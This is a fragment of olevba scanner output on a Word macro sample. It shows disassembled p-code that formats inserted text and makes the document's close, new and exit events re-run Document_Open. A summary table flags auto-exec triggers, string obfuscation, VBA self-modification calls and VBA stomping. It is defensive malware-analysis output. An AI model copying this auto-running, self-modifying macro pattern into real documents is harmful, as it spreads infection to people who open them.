' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0015 
' 	ParamNamed Count 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall MoveLeft 0x0003 
' Line #129:
' 	Ld wdToggle 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Bold 
' Line #130:
' 	LitDI2 0x0014 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #131:
' 	Ld wdRed 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #132:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0004 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveLeft 0x0002 
' Line #133:
' 	Ld wdBlue 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #134:
' 	LitStr 0x000E "Monotype Sorts"
' 	ParamNamed Font 
' 	LitDI2 0x0FD6 
' 	UMi 
' 	ParamNamed CharacterNumber 
' 	LitVarSpecial (True)
' 	ParamNamed Unicode 
' 	Ld Selection 
' 	ArgsMemCall InsertSymbol 0x0003 
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	EndSub 
' Line #137:
' 	FuncDefn (Private Sub Document_Close())
' Line #138:
' 	ArgsCall Document_Open 0x0000 
' Line #139:
' 	EndSub 
' Line #140:
' 	FuncDefn (Private Sub Document_New())
' Line #141:
' 	ArgsCall Document_Open 0x0000 
' Line #142:
' 	EndSub 
' Line #143:
' 	FuncDefn (Private Sub Document_Exit())
' Line #144:
' 	ArgsCall Document_Open 0x0000 
' Line #145:
' 	EndSub 
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

